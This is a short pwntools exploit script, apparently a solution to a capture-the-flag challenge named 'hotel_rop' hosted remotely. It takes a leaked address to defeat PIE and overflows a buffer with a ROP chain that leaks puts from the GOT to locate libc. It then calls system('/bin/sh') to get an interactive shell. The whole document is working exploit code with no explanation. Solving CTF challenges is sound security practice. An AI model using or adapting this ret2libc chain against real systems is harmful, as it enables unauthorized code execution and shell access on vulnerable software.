from pwn import *
#s = process('./hotel_rop')
s = remote('dctf1-chall-hotel-rop.westeurope.azurecontainer.io', 7480)


main = int(s.recvline().split()[-1], 16)
print(hex(main))
base = main - 0x136d

system   = base + 0x1040
pop_rdi  = base + 0x140b
puts_plt = base + 0x1030
puts_got = base + 0x4018
vuln     = base + 0x131e
ret      = base + 0x1016


s.recvline()

payload = b'A' * 40
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(vuln)

s.sendline(payload)

s.recvline()
addr = u64((s.recvline()[:-1]).ljust(8, b'\00'))
print(hex(addr))

libc = ELF("./libc6_2.31-0ubuntu9_amd64.so")
libc.address = addr - 0x0875a0

payload = b'A' * 40
payload += p64(pop_rdi)
payload += p64(next(libc.search(b'/bin/sh\x00')))
payload += p64(ret)
payload += p64(libc.symbols['system'])
s.sendline(payload)


s.interactive()
